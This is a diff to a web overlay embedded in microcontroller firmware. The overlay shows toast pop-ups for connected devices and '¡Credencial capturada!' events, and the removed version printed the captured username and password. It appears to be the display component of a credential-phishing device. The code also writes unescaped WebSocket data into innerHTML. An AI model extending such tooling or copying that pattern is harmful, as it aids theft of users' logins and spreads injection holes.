@@ -22,9 +22,9 @@ const char HTML_TOAST_OBS[] PROGMEM = R"rawliteral(
 
     .toast-container {
       position: fixed;
-      top: 20px;
-      right: 20px;
-      width: 300px;
+      top: 4vw;
+      right: 4vw;
+      width: 100vw;
       max-width: 90%;
       z-index: 1000;
       display: flex;
@@ -34,27 +34,27 @@ const char HTML_TOAST_OBS[] PROGMEM = R"rawliteral(
     .toast {
       background-color: rgba(44, 44, 44, 0.9);
       color: white;
-      padding: 15px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      margin-bottom: 10px;
+      padding: 3vw;
+      border-radius: 2vw;
+      box-shadow: 0 1vw 2vw rgba(0, 0, 0, 0.2);
+      margin-bottom: 2vw;
       opacity: 0;
       transform: translateX(100%);
-      animation: slideIn 0.5s forwards, fadeOut 0.5s forwards 4s;
+      animation: slideIn 0.5s forwards, fadeOut 0.5s forwards 12s;
       transition: opacity 0.5s, transform 0.5s;
       position: relative;
       word-wrap: break-word;
-      border-left: 5px solid #ff4d4d;
+      border-left: 6vw solid #ff4d4d;
     }
 
     .toast-title {
       font-weight: bold;
-      margin-bottom: 5px;
-      font-size: 1.1em;
+      margin-bottom: 1vw;
+      font-size: 2.4em;
     }
 
     .toast-content {
-      font-size: 0.9em;
+      font-size: 2em;
     }
 
     @keyframes slideIn {
@@ -91,8 +91,8 @@ const char HTML_TOAST_OBS[] PROGMEM = R"rawliteral(
     socket.onopen = function (event) { console.log('Conexión WebSocket abierta.'); };
     socket.onmessage = function (event) {
       try {
-        const data = JSON.parse(event.data);
-        if (data.user && data.pass) { createToast(data.user, data.pass); }
+        const payload = JSON.parse(event.data);
+        if (payload.type && payload.data) { createToast(payload.type, payload.data); }
       } catch (e) { console.error('Error al parsear JSON:', e); }
     };
     socket.onclose = function (event) {
@@ -100,17 +100,44 @@ const char HTML_TOAST_OBS[] PROGMEM = R"rawliteral(
     };
     socket.onerror = function (error) { console.error('Error WebSocket:', error); };
 
-    function createToast(user, pass) {
+    function createToast(type, data) {
       const toast = document.createElement('div');
       toast.className = 'toast';
+
+      let title = '';
+      let borderColor = '#ccc';
+
+      switch (type) {
+        case 'connect':
+          title = 'Nuevo dispositivo conectado';
+          borderColor = '#4dff4d'; // verde
+          break;
+        case 'disconnect':
+          title = 'Dispositivo desconectado';
+          borderColor = '#ff4d4d'; // rojo
+          break;
+        case 'capture':
+          title = '¡Credencial capturada!';
+          borderColor = '#4d94ff'; // azul
+          break;
+        default:
+          title = 'Evento';
+          borderColor = '#ccc';
+      }
+
+      let content = '';
+      for (const key in data) {
+        if (data.hasOwnProperty(key)) {
+          content += `<strong>${key}:</strong> ${data[key]}<br>`;
+        }
+      }
+
+      toast.style.borderColor = borderColor;
       toast.innerHTML = `
-                <div class="toast-title">¡Credencial Capturada!</div>
-                <div class="toast-content">
-                    <strong>Usuario:</strong> ${user}<br>
-                    <strong>Contraseña:</strong> ${pass}
-                </div>
-            `;
-      toastContainer.prepend(toast);
+      <div class="toast-title">${title}</div>
+      <div class="toast-content">${content}</div>
+    `;
+      toastContainer.append(toast);
       toast.addEventListener('animationend', (e) => {
         if (e.animationName === 'fadeOut') { toast.remove(); }
       });
